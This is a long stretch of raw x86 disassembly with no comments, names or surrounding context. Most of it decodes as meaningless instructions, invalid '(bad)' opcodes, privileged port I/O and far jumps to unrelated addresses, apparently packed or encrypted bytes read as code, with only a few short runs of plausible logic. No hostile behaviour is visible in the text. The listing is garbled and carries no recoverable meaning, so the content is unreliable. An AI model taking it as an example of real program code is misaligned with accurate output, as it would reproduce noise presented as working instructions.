  402136:	mov    bh,0xc3
  402138:	das    
  402139:	rcr    DWORD PTR [esi+0x5f53780c],0x23
  402140:	cmp    ebx,DWORD PTR [eax+eax*1]
  402143:	div    bl
  402145:	cli    
  402146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402147:	in     eax,0xfe
  402149:	jmp    0x53d65a89
  40214e:	inc    eax
  40214f:	aad    0x2f
  402151:	shl    ecx,1
  402153:	xor    edi,0x1776a964
  402159:	dec    ebx
  40215a:	clc    
  40215b:	or     esp,DWORD PTR [ecx-0x32ede06d]
  402161:	push   eax
  402162:	stc    
  402163:	loop   0x40216b
  402165:	sub    BYTE PTR [ecx-0x22],bl
  402168:	jo     0x4020f8
  40216a:	xchg   BYTE PTR [edi+0x54],al
  40216d:	mov    bl,al
  40216f:	sbb    al,0xb1
  402171:	pop    ss
  402172:	in     al,dx
  402173:	popa   
  402174:	jg     0x4021ed
  402176:	xchg   edi,eax
  402177:	add    ch,BYTE PTR ds:0xab6d5392
  40217d:	sub    al,0x2
  40217f:	xchg   edx,eax
  402180:	outs   dx,DWORD PTR ds:[esi]
  402181:	popa   
  402182:	add    esp,DWORD PTR [ecx]
  402184:	fwait
  402185:	inc    esp
  402186:	mov    al,0x71
  402188:	add    DWORD PTR cs:[ebp+0x592fc496],0x4ec66f32
  402193:	mov    ah,0x32
  402195:	pop    eax
  402196:	call   DWORD PTR [edi+ebp*2-0x70]
  40219a:	and    DWORD PTR [esi],edi
  40219c:	in     eax,0x1b
  40219e:	sub    BYTE PTR [esp+ebp*4-0x48],0xc7
  4021a3:	pop    eax
  4021a4:	adc    al,0xf4
  4021a6:	xchg   ebx,eax
  4021a7:	xchg   ebp,eax
  4021a8:	xor    eax,0x6f1e22d0
  4021ad:	shr    DWORD PTR [ebp+esi*1+0x24],1
  4021b1:	inc    ecx
  4021b2:	int3   
  4021b3:	mov    cl,ah
  4021b5:	jge    0x4021f5
  4021b7:	outs   dx,BYTE PTR ds:[esi]
  4021b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021b9:	and    BYTE PTR [ebx],cl
  4021bb:	cmp    edi,DWORD PTR [esi-0x62]
  4021be:	jae    0x40214d
  4021c0:	pusha  
  4021c1:	dec    DWORD PTR [ecx+eax*4-0x4f5a9870]
  4021c8:	test   DWORD PTR [ebp+0x42c46c82],edx
  4021ce:	fld    st(3)
  4021d0:	push   eax
  4021d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021d2:	loope  0x4021ba
  4021d4:	mov    esi,0xd1a2f126
  4021d9:	and    DWORD PTR [esi+eiz*8-0xd5522b5],edi
  4021e0:	jge    0x4021ba
  4021e2:	popa   
  4021e3:	or     ah,BYTE PTR [esi-0xb]
  4021e6:	ja     0x40222d
  4021e8:	adc    esi,DWORD PTR ds:0x8824ef64
  4021ee:	(bad)  
  4021ef:	xor    al,0xad
  4021f1:	pop    edx
  4021f2:	fcmovnb st,st(0)
  4021f4:	mov    cl,0x6d
  4021f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021f7:	or     ebx,DWORD PTR [esi+edi*1+0x6c210e79]
  4021fe:	xchg   edx,eax
  4021ff:	test   BYTE PTR [edx+0x44ba8585],dh
  402205:	xchg   ebx,eax
  402206:	jnp    0xefcbc205
  40220c:	xchg   edx,eax
  40220d:	ins    DWORD PTR es:[edi],dx
  40220e:	xor    edx,DWORD PTR [ecx-0x31]
  402211:	xchg   esp,eax
  402212:	rcl    BYTE PTR [ebx],1
  402214:	jle    0x40222f
  402216:	fstp   DWORD PTR [esi+ebx*4]
  402219:	ret    
  40221a:	test   al,0x6a
  40221c:	repnz push edx
  40221e:	jns    0x402285
  402220:	cmp    DWORD PTR [edi],ecx
  402222:	scas   al,BYTE PTR es:[edi]
  402223:	xchg   esp,eax
  402224:	clc    
  402225:	ss cmp eax,0x7118088a
  40222b:	daa    
  40222c:	sti    
  40222d:	ror    DWORD PTR [edx],0x2b
  402230:	xchg   ebp,eax
  402231:	and    BYTE PTR [ebx+esi*2-0x60e86f0c],ah
  402238:	leave  
  402239:	mov    BYTE PTR [esi],dl
  40223b:	call   0x4d4b:0x9bdbc7f8
  402242:	shr    DWORD PTR [ebp+edi*1-0x4558081b],cl
  402249:	cmp    eax,0xeb5334ec
  40224e:	xor    eax,0x330c4d8b
  402253:	(bad)  
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi-0x375351c1],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x402224
  4022a2:	(bad)  
  4022a4:	pop    esp
  4022a5:	add    BYTE PTR [edi-0x23f887a3],bh
  4022ab:	sti    
  4022ac:	mov    bh,0xde
  4022ae:	jnp    0x4022cc
  4022b0:	jg     0x4022e9
  4022b2:	repz mov ecx,0x2a444330
  4022b8:	jmp    0x40225d
  4022ba:	jno    0x4022f3
  4022bc:	std    
  4022bd:	push   edi
  4022be:	repnz adc BYTE PTR [eax],ch
  4022c1:	jae    0x40228c
  4022c3:	xchg   ebp,eax
  4022c4:	jo     0x4022ff
  4022c6:	js     0x402252
  4022c8:	xor    eax,0x888b7a24
  4022cd:	aaa    
  4022ce:	(bad)  
  4022cf:	in     eax,dx
  4022d0:	add    ch,BYTE PTR [edx]
  4022d2:	pop    edi
  4022d3:	dec    eax
  4022d4:	jne    0x4022e7
  4022d6:	and    eax,0x157b9ffc
  4022db:	pop    ds
  4022dc:	mov    esp,0xd5484c95
  4022e1:	fisub  WORD PTR [ebx+0x2d3b0284]
  4022e7:	pop    ss
  4022e8:	mov    ds:0xef80bf9d,eax
  4022ed:	loopne 0x4022bc
  4022ef:	dec    ebx
  4022f0:	addr16 lahf 
  4022f2:	xor    ebp,DWORD PTR [ebp+ebx*8-0x24]
  4022f6:	inc    ebp
  4022f7:	inc    edi
  4022f8:	dec    esp
  4022f9:	pop    edx
  4022fa:	sbb    DWORD PTR [eax-0x5094ea7e],ecx
  402300:	xchg   ebx,eax
  402301:	adc    al,0xe2
  402303:	pop    ss
  402304:	add    DWORD PTR [edi+0x4f],ebp
  402307:	cmp    BYTE PTR [eax-0x5fa86a38],0xba
  40230e:	xor    BYTE PTR [ecx],ch
  402310:	adc    edi,DWORD PTR [edi]
  402312:	sbb    ecx,ebx
  402314:	lds    ebp,FWORD PTR [edi-0x6f]
  402317:	and    BYTE PTR [edi+0x320ac2ca],ah
  40231d:	sub    al,0xc0
  40231f:	xor    eax,0xfa0654ab
  402324:	fs jb  0x402394
  402327:	cmp    BYTE PTR [esi+0x7a],bl
  40232a:	jmp    0x40238b
  40232c:	iret   
  40232d:	fs jmp 0x5f53:0x1d7bda42
  402335:	es mov esi,0x5495ea0a
  40233b:	pop    ds
  40233c:	sbb    al,BYTE PTR [ebx+0x28ff258]
  402342:	leave  
  402343:	scas   al,BYTE PTR es:[edi]
  402344:	or     DWORD PTR [edi+0x4a],eax
  402347:	or     al,0x65
  402349:	das    
  40234a:	and    al,BYTE PTR [esi+eax*2-0xf329e6]
  402351:	mov    eax,ds:0xbefcb0
  402356:	in     al,0x3d
  402358:	pop    edx
  402359:	mov    ebp,0x8b1c3be
  40235e:	fs pop ecx
  402360:	mov    gs,WORD PTR [edx+0x41cc7e1f]
  402366:	mov    ds:0x879a6ac8,eax
  40236b:	in     al,dx
  40236c:	pop    ss
  40236d:	jl     0x4023b7
  40236f:	jbe    0x40236f
  402371:	or     ebx,eax
  402373:	sbb    esp,edi
  402375:	aas    
  402376:	lea    ebp,[edx+0x4]
  402379:	and    dh,BYTE PTR [ebp-0x6]
  40237c:	mov    edi,0x95e4b079
  402381:	dec    esi
  402382:	mov    cl,cl
  402384:	stc    
  402385:	mov    al,0x54
  402387:	mov    DWORD PTR [edx+0x8],ebx
  40238a:	pop    ebp
  40238b:	push   ds
  40238c:	xor    eax,0x469d038f
  402391:	inc    ebp
  402392:	add    al,0x51
  402394:	pop    eax
  402395:	inc    ebx
  402396:	adc    DWORD PTR [edi+eiz*2+0x46],ebp
  40239a:	xlat   BYTE PTR ds:[ebx]
  40239b:	lock daa 
  40239d:	sub    DWORD PTR [ecx-0x54],esi
  4023a0:	sub    ah,dh
  4023a2:	aas    
  4023a3:	std    
  4023a4:	mov    ebp,0xac67d7e1
  4023a9:	addr16 ja 0x4023da
  4023ac:	mov    esp,0x82f2daf8
  4023b1:	adc    al,0xc1
  4023b3:	push   edx
  4023b4:	mov    ch,0xc5
  4023b6:	stc    
  4023b7:	xchg   ecx,eax
  4023b8:	pop    edx
  4023b9:	iret   
  4023ba:	sbb    eax,0x6cd42a37
  4023bf:	sub    BYTE PTR [eax],cl
  4023c1:	mov    ?,WORD PTR [ecx]
  4023c3:	and    al,0xc9
  4023c5:	xchg   edx,eax
  4023c6:	imul   esi,esi,0x8f97a84e
  4023cc:	push   edx
  4023cd:	fcomp  QWORD PTR ds:0xeab20bcf
  4023d3:	xchg   BYTE PTR [edx],ah
  4023d5:	cmp    al,0x68
  4023d7:	ret    
  4023d8:	mov    ds:0xdb81eb9b,eax
  4023dd:	ror    DWORD PTR [esi-0x42aa4c0c],1
  4023e3:	pop    ebx
  4023e4:	pop    ss
  4023e5:	ret    0x7e16
  4023e8:	jns    0x402448
  4023ea:	cmc    
  4023eb:	hlt    
  4023ec:	cmc    
  4023ed:	xor    edx,edx
  4023ef:	rcr    BYTE PTR [eax],cl
  4023f1:	mov    cl,0x59
  4023f3:	mov    ebx,DWORD PTR [edx]
  4023f5:	mov    ?,eax
  4023f7:	ret    
  4023f8:	xor    cl,BYTE PTR [esi+0x30c9aade]
  4023fe:	int    0x51
  402400:	cmp    BYTE PTR [esi-0x5d],bl
  402403:	jno    0x4023e0
  402405:	out    0xbb,eax
  402407:	cmp    eax,0x15b79452
  40240c:	push   ds
  40240d:	scas   al,BYTE PTR es:[edi]
  40240e:	ss push eax
  402410:	xchg   esp,eax
  402411:	out    dx,al
  402412:	mov    BYTE PTR [edi-0x3d],0xde
  402416:	sar    BYTE PTR [edx],1
  402418:	add    BYTE PTR [ebx],dh
  40241a:	mov    ss,WORD PTR [esi+edx*4-0x77]
  40241e:	mov    al,ds:0x7fd0036e
  402423:	aaa    
  402424:	out    dx,al
  402425:	sub    eax,0xa5a2f1c9
  40242a:	or     edi,edx
  40242c:	ret    0x550e
  40242f:	nop
  402430:	xchg   DWORD PTR [ecx-0x1a29a34d],eax
  402436:	sar    DWORD PTR [bx+0x7e],cl
  40243a:	out    dx,eax
  40243b:	inc    ecx
  40243c:	push   ds
  40243d:	jnp    0x4023e1
  40243f:	(bad)  [ebp+0x9]
  402442:	mov    ebx,edi
  402444:	pop    edi
  402445:	iret   
  402446:	fwait
  402447:	mov    ebp,0xccaa6ac
  40244c:	push   esp
  40244d:	imul   ebx,DWORD PTR [esi],0x7231dc1d
  402453:	xchg   esp,eax
  402454:	pop    ss
  402455:	push   esi
  402456:	adc    edi,DWORD PTR [esi+0x5d2b0f87]
  40245c:	xor    DWORD PTR [edx-0xd],esp
  40245f:	xchg   esp,eax
  402460:	dec    esp
  402461:	aaa    
  402462:	xor    BYTE PTR [ebp-0x12],ah
  402465:	jbe    0x402451
  402467:	sbb    ebp,edx
  402469:	aaa    
  40246a:	mov    al,0x20
  40246c:	bswap  edx
  40246e:	mov    al,0x3c
  402470:	stc    
  402471:	ja     0x402462
  402473:	inc    edx
  402474:	lds    ebx,FWORD PTR [edi+0x64]
  402477:	sub    bh,BYTE PTR [edi+0x9]
  40247a:	inc    esp
  40247b:	fldenv es:[esp+ebx*8-0x22]
  402480:	in     al,dx
  402481:	inc    ebx
  402482:	cli    
  402483:	dec    edx
  402484:	push   esp
  402485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402486:	jp     0x4024e5
  402488:	ret    
  402489:	popa   
  40248a:	ret    
  40248b:	(bad)
  40248f:	pop    esp
  402490:	xchg   esi,eax
  402491:	bound  ebx,QWORD PTR cs:[esi+0x745e24df]
  402498:	add    DWORD PTR [esi+0x7c],eax
  40249b:	aas    
  40249c:	jmp    0x4024b0
  40249e:	pop    eax
  40249f:	mov    al,0x3d
  4024a1:	mov    dl,0x61
  4024a3:	rcl    BYTE PTR [eax-0x2a26b2bc],cl
  4024a9:	imul   edx,DWORD PTR [eax+0x30],0x9aaa6ed6
  4024b0:	inc    edx
  4024b1:	mov    eax,ds:0xe6170fe1
  4024b6:	iret   
  4024b7:	xlat   BYTE PTR ds:[ebx]
  4024b8:	ss xchg ebx,eax
  4024ba:	mov    edx,0xcd13f8d9
  4024bf:	inc    ecx
  4024c0:	(bad)  
  4024c2:	push   ebx
  4024c3:	push   ds
  4024c4:	fbstp  TBYTE PTR [edx-0x63]
  4024c7:	std    
  4024c8:	mov    ah,0xf1
  4024ca:	add    DWORD PTR [eax],0x3f
  4024cd:	push   0x91a2304b
  4024d2:	hlt    
  4024d3:	sub    eax,0xa9c5625f
  4024d8:	or     ecx,esi
  4024da:	stos   BYTE PTR es:[edi],al
  4024db:	jge    0x4024da
  4024dd:	push   ecx
  4024de:	jg     0x4024ef
  4024e0:	xor    ebp,DWORD PTR [edx-0x16c027a8]
  4024e6:	dec    ebp
  4024e7:	xlat   BYTE PTR ds:[ebx]
  4024e8:	std    
  4024e9:	pop    ebp
  4024ea:	and    eax,0x54b1de9d
  4024ef:	aad    0x7a
  4024f1:	in     eax,0xdf
  4024f3:	mov    ds:0xb7c84fdd,al
  4024f8:	aad    0x7
  4024fa:	sar    BYTE PTR [edi+0x6492735c],1
  402500:	pop    edi
  402501:	lahf   
  402502:	mov    ebx,edx
  402504:	ss xchg edx,eax
  402506:	add    DWORD PTR [edi-0x5d],ecx
  402509:	sbb    DWORD PTR [edx+ebx*2-0x56],eax
  40250d:	xchg   ecx,eax
  40250e:	push   0xffffffa5
  402510:	cmp    BYTE PTR [esp+ecx*2+0x6ea6a1fe],dh
  402517:	xchg   ebp,ebp
  402519:	test   BYTE PTR [edi-0x787d80c1],al
  40251f:	aaa    
  402520:	pop    eax
  402521:	adc    al,0xa9
  402523:	sub    al,0xf6
  402525:	jle    0x402531
  402527:	das    
  402528:	mov    bh,0x12
  40252a:	lods   eax,DWORD PTR ds:[esi]
  40252b:	jp     0x4024f1
  40252d:	inc    edx
  40252e:	pop    edx
  40252f:	xor    ebp,DWORD PTR [esi+ecx*8]
  402532:	sub    eax,0xf0baefaf
  402537:	jne    0x4024f7
  402539:	adc    eax,0xfea32f5
  40253e:	mov    esp,0xfc82a19f
  402543:	adc    esp,DWORD PTR [esi]
  402545:	mov    eax,0x575a19a4
  40254a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40254b:	push   eax
  40254c:	outs   dx,BYTE PTR ds:[esi]
  40254d:	add    eax,eax
  40254f:	loopne 0x4025a5
  402551:	dec    esi
  402552:	fistp  WORD PTR [eax+0x221abfaf]
  402558:	lahf   
  402559:	mov    eax,0xf3c9ef1d
  40255e:	imul   eax,DWORD PTR [edi],0x7c
  402561:	das    
  402562:	jno    0x402557
  402564:	pop    esp
  402565:	and    bh,BYTE PTR [ebp-0x60]
  402568:	sbb    dh,BYTE PTR [ebx+0x7d]
  40256b:	cmp    BYTE PTR [ecx+ecx*8-0x384418],dl
  402572:	pusha  
  402573:	je     0x40258d
  402575:	or     eax,0x24a88e4e
  40257a:	push   0xffffff9f
  40257c:	mov    eax,0x3e5f8a4a
  402581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402582:	jmp    0x632c96b6
  402587:	pop    esp
  402588:	mov    ch,0x9f
  40258a:	xor    eax,esi
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	xchg   esp,eax
  4025ae:	enter  0x2bac,0xea
  4025b2:	(bad)  
  4025b4:	jl     0x40261d
  4025b6:	jle    0x402634
  4025b8:	jl     0x40258b
  4025ba:	xor    eax,0xa05d0af4
  4025bf:	mov    edx,0xe704ee4b
  4025c4:	shl    BYTE PTR [edx+0x7ea4d664],0xbb
  4025cb:	sub    edx,DWORD PTR [edi]
  4025cd:	push   0x32a5671f
  4025d2:	pop    edx
  4025d3:	daa    
  4025d4:	imul   edx,esp,0x4d
  4025d7:	je     0x4025a0
  4025d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025da:	scas   al,BYTE PTR es:[edi]
  4025db:	mov    eax,0x4209bff5
  4025e0:	mov    edx,0x51177c05
  4025e5:	mov    ch,0xd6
  4025e7:	fadd   st,st(6)
  4025e9:	mov    dl,BYTE PTR [ebp+0x2659c2b1]
  4025ef:	into   
  4025f0:	loopne 0x402585
  4025f2:	ins    BYTE PTR es:[edi],dx
  4025f3:	mov    al,ds:0x189671b9
  4025f8:	daa    
  4025f9:	jp     0x4025cd
  4025fb:	add    al,0xcb
  4025fd:	js     0x402609
  4025ff:	sbb    al,0xd1
  402601:	xchg   edx,eax
  402602:	fldcw  WORD PTR [edi+0x279d8668]
  402608:	dec    ebp
  40260a:	cwde   
  40260b:	sbb    BYTE PTR [edx+eiz*1],bh
  40260e:	dec    edi
  40260f:	sub    al,0x99
  402611:	fst    DWORD PTR [eax]
  402613:	and    eax,0xe1f51c75
  402618:	jb     0x402648
  40261a:	inc    esi
  40261b:	mov    ebp,0x1911d6a2
  402620:	mov    dl,0x16
  402622:	sub    ah,cl
  402624:	push   cs
  402625:	jne    0x402640
  402627:	stc    
  402628:	pop    es
  402629:	mov    edi,0xd4aea43f
  40262e:	(bad)  
  40262f:	or     ch,bl
  402631:	adc    al,0x4
  402633:	add    BYTE PTR [esp+ebp*2+0x3c],cl
  402637:	cmp    BYTE PTR [edi-0x279548dc],0x52
  40263e:	mov    ebp,0xf6946573
  402643:	add    edi,DWORD PTR [ebx]
  402645:	fisub  WORD PTR [edx]
  402647:	inc    edi
  402648:	xchg   edx,eax
  402649:	and    esi,DWORD PTR [ecx]
  40264b:	ss stc 
  40264d:	sub    edi,eax
  40264f:	cmp    DWORD PTR ds:0x525d7583,0x3e
  402656:	iret   
  402657:	jmp    0xf49c3775
  40265c:	sub    edi,DWORD PTR [edx]
  40265e:	cmp    eax,0x6006520
  402663:	enter  0xc2,0xb7
  402667:	mov    eax,ds:0x36fc7d87
  40266c:	jbe    0x402600
  40266e:	mov    ds:0x5fee9968,al
  402673:	scas   al,BYTE PTR es:[edi]
  402674:	inc    edi
  402675:	jnp    0x40260e
  402677:	mov    ch,0x7
  402679:	fst    QWORD PTR [esi+0x32]
  40267c:	jmp    0xdd38:0xea08a372
  402683:	push   edx
  402684:	addr16 sub al,0x74
  402687:	dec    eax
  402688:	fidiv  DWORD PTR [ebx+0x17]
  40268b:	stc    
  40268c:	repz retf 
  40268e:	cmp    al,0xc7
  402690:	sbb    BYTE PTR [ebx+eax*1-0xc],bl
  402694:	or     bh,bl
  402696:	jne    0x402671
  402698:	imul   edi,esp,0x77
  40269b:	gs dec ebp
  40269d:	fcomi  st,st(6)
  40269f:	cmp    BYTE PTR [ebx+0x1dcbda06],0xa8
  4026a6:	or     dh,al
  4026a8:	xchg   ebp,eax
  4026a9:	retf   
  4026aa:	or     ebx,edx
  4026ac:	pop    eax
  4026ad:	bound  edx,QWORD PTR [esi]
  4026af:	sub    edx,DWORD PTR [edx]
  4026b1:	and    DWORD PTR [edi+0x42],ebx
  4026b4:	add    dl,dl
  4026b6:	and    eax,0xbcbfbdc9
  4026bb:	in     eax,0x81
  4026bd:	push   ss
  4026be:	inc    edi
  4026bf:	pop    ecx
  4026c0:	dec    ebx
  4026c1:	dec    ebp
  4026c2:	(bad)  
  4026c3:	imul   ebp,ebx,0xffffffca
  4026c6:	pop    eax
  4026c7:	inc    edi
  4026c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026c9:	aad    0xd6
  4026cb:	push   es
  4026cc:	pop    esi
  4026cd:	je     0x402723
  4026cf:	rcr    DWORD PTR [ebp-0x62],cl
  4026d2:	icebp  
  4026d3:	fistp  DWORD PTR [ebx]
  4026d5:	pop    esi
  4026d6:	outs   dx,DWORD PTR ds:[esi]
  4026d7:	sbb    al,0x54
  4026d9:	mov    dh,0xf9
  4026db:	inc    ecx
  4026dc:	push   ebx
  4026dd:	(bad)  
  4026df:	jl     0x402717
  4026e1:	pop    esi
  4026e2:	mov    DWORD PTR [ebx+0x50],ecx
  4026e5:	lock out dx,al
  4026e7:	or     DWORD PTR [esi+0x2d],0x91a0ae53
  4026ee:	inc    edi
  4026ef:	stc    
  4026f0:	adc    ah,BYTE PTR [ecx]
  4026f2:	sub    bh,ah
  4026f4:	hlt    
  4026f5:	inc    eax
  4026f6:	stos   BYTE PTR es:[edi],al
  4026f7:	sbb    cl,bl
  4026f9:	sbb    BYTE PTR [esi+0x22],cl
  4026fc:	out    dx,al
  4026fd:	cmp    al,0x69
  4026ff:	dec    ebp
  402700:	pop    es
  402701:	into   
  402702:	xchg   cl,dh
  402704:	in     al,0x7a
  402706:	mov    ecx,0xfd67d7fc
  40270b:	sbb    ecx,DWORD PTR [eax-0x4]
  40270e:	xchg   esi,eax
  40270f:	bound  ebp,QWORD PTR [ecx+0x58]
  402712:	ret    
  402713:	xchg   ebp,eax
  402714:	cld    
  402715:	and    DWORD PTR [ecx],eax
  402717:	or     dh,BYTE PTR [ebx]
  402719:	int3   
  40271a:	and    ecx,ebp
  40271c:	or     DWORD PTR [ebp+ebx*2-0x1371f385],eax
  402723:	mov    eax,0xcd1227de
  402728:	dec    si
  40272a:	addr16 shl ebp,0xab
  40272e:	add    al,0xde
  402730:	push   0x5f169ccd
  402735:	jge    0x402780
  402737:	nop
  402738:	pop    ss
  402739:	gs (bad) 
  40273b:	(bad)  
  40273c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40273d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40273e:	icebp  
  40273f:	pushf  
  402740:	dec    eax
  402741:	enter  0x8391,0x6b
  402745:	ret    0x7f33
  402748:	mov    edi,0xc8b3d200
  40274d:	cmp    bl,BYTE PTR [edx]
  40274f:	dec    edx
  402750:	push   esp
  402751:	ds xor eax,0x509e2663
  402757:	mov    BYTE PTR [ebx-0x1aa4a519],ah
  40275d:	jnp    0x402706
  40275f:	mov    edi,DWORD PTR [edi+ebp*2-0x35]
  402763:	adc    al,BYTE PTR [edi+edi*8]
  402766:	pushf  
  402767:	cmp    DWORD PTR [esi+edi*1-0x5c],esi
  40276b:	mov    bl,0x7a
  40276d:	inc    ebp
  40276e:	pop    ecx
  40276f:	pop    edx
  402770:	stc    
  402771:	adc    dh,BYTE PTR [eax+eax*1+0x5b7e7dd6]
  402778:	sti    
  402779:	jmp    0x5e48941e
  40277e:	push   0x49
  402780:	push   ds
  402781:	or     al,0x1c
  402783:	(bad)  
  402784:	pop    esp
  402785:	pop    esp
  402786:	mov    ebp,ebp
  402788:	xchg   ebx,eax
  402789:	popa   
  40278a:	sub    cl,dh
  40278c:	xchg   ecx,eax
  40278d:	ds sahf 
  40278f:	mov    edx,0xc44eee65
  402794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402795:	in     eax,0xc7
  402797:	add    eax,0xafc2d824
  40279c:	xor    DWORD PTR [ebp+0x3e],0x524aa7b1
  4027a3:	fwait
  4027a4:	pop    ebx
  4027a5:	pop    edx
  4027a6:	stos   DWORD PTR es:[edi],eax
  4027a7:	stos   DWORD PTR es:[edi],eax
  4027a8:	stc    
  4027a9:	sbb    BYTE PTR [edi+0x3c49fbd8],bl
  4027af:	test   BYTE PTR [ecx-0x5c48cc6],bh
  4027b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b6:	adc    al,0x4d
  4027b8:	sub    ch,al
  4027ba:	push   ecx
  4027bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027bc:	sub    ch,BYTE PTR [edx+0x59]
  4027bf:	jae    0x4027e5
  4027c1:	add    bl,BYTE PTR [edi+eax*8+0x7373422d]
  4027c8:	jmp    0xeb27d1ac
  4027cd:	push   ecx
  4027ce:	icebp  
  4027cf:	in     eax,dx
  4027d0:	xor    edx,DWORD PTR ds:0x4e0f5ffa
  4027d6:	mov    BYTE PTR [ecx],bl
  4027d8:	sbb    eax,0x1a956a94
  4027dd:	das    
  4027de:	(bad)  [edx+0x3c]
  4027e1:	daa    
  4027e2:	dec    eax
  4027e3:	adc    DWORD PTR [esi-0x7ce3ed28],edx
  4027e9:	sub    BYTE PTR [ebx-0x14fd44a4],bl
  4027ef:	xchg   esp,eax
  4027f0:	outs   dx,BYTE PTR ds:[esi]
  4027f1:	mov    ebp,0x381c8b5b
  4027f6:	in     eax,0xa2
  4027f8:	in     al,dx
  4027f9:	test   al,0x7f
  4027fb:	mov    bh,0xf2
  4027fd:	push   edx
  4027fe:	gs jae 0x402819
  402801:	mov    ah,ah
  402803:	lahf   
  402804:	dec    ebx
  402805:	sub    ebx,DWORD PTR [edi-0x2e]
  402808:	sbb    al,0x1a
  40280a:	(bad)  
  40280b:	cli    
  40280c:	xor    ah,BYTE PTR [ebx+0x7a]
  40280f:	xor    BYTE PTR [ebx-0x73],ah
  402812:	pop    ds
  402813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402814:	lock adc BYTE PTR [edi+0x68591fc9],dh
  40281b:	sub    cl,al
  40281d:	dec    edx
  40281e:	push   edx
  40281f:	jmp    0xe99b6046
  402824:	mov    bl,0x48
  402826:	sti    
  402827:	xor    al,0xb4
  402829:	inc    esp
  40282a:	lods   al,BYTE PTR ds:[esi]
  40282b:	push   ds
  40282c:	dec    ebp
  40282d:	popa   
  40282e:	inc    esi
  40282f:	and    eax,0x8e463154
  402834:	inc    ebp
  402835:	sbb    BYTE PTR [edi+0x38],bh
  402838:	retf   
  402839:	or     BYTE PTR [eax-0x305f631d],bh
  40283f:	jge    0x40283a
  402841:	cmp    DWORD PTR [eax+0x1e],ebp
  402844:	shl    BYTE PTR [eax],cl
  402846:	dec    ebp
  402847:	mov    eax,ds:0x9aefac41
  40284c:	cmpxchg BYTE PTR [ecx+edi*4+0x76],dl
  402851:	mov    dl,0x7f
  402853:	in     eax,0xf5
  402855:	jmp    0xa9574dcc
  40285a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40285b:	dec    eax
  40285c:	lods   eax,DWORD PTR ds:[esi]
  40285d:	push   0xffffffbb
  40285f:	inc    ecx
  402860:	sub    esi,DWORD PTR [edi+eax*4-0x78797ef5]
  402867:	mov    eax,0x77f10cd5
  40286c:	pop    ds
  40286d:	cli    
  40286e:	test   DWORD PTR [ebp-0x77],eax
  402871:	sbb    DWORD PTR [eax-0x3dc17ed4],0x75
  402878:	mov    dh,0x40
  40287a:	ins    DWORD PTR es:[edi],dx
  40287b:	rcr    ch,cl
  40287d:	jo     0x40286d
  40287f:	mov    ebx,0x493f856f
  402884:	shr    ebx,0xab
  402887:	xchg   ebp,eax
  402888:	xor    dl,BYTE PTR [edx]
  40288a:	out    0xb,eax
  40288c:	mov    ch,0xcc
  40288e:	sbb    ebx,esi
  402890:	hlt    
  402891:	ja     0x4028c2
  402893:	pop    edi
  402894:	lods   al,BYTE PTR ds:[esi]
  402895:	aad    0xbc
  402897:	scas   al,BYTE PTR es:[edi]
  402898:	xlat   BYTE PTR ds:[ebx]
  402899:	dec    ebp
  40289a:	xlat   BYTE PTR ds:[ebx]
  40289b:	bound  edi,QWORD PTR [ebx+0x14]
  40289e:	sbb    DWORD PTR [edx-0x7bf0e897],ebp
  4028a4:	push   cs
  4028a5:	add    BYTE PTR [eax],al
  4028a7:	add    BYTE PTR [ebx+0xc7f845],cl
  4028ad:	lea    ebx,[esi]
  4028af:	xor    al,0x60
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	rcr    DWORD PTR [eax-0x42],1
  4028e4:	fisttp QWORD PTR gs:[eax]
  4028e7:	jl     0x402965
  4028e9:	addr16 jle 0x402968
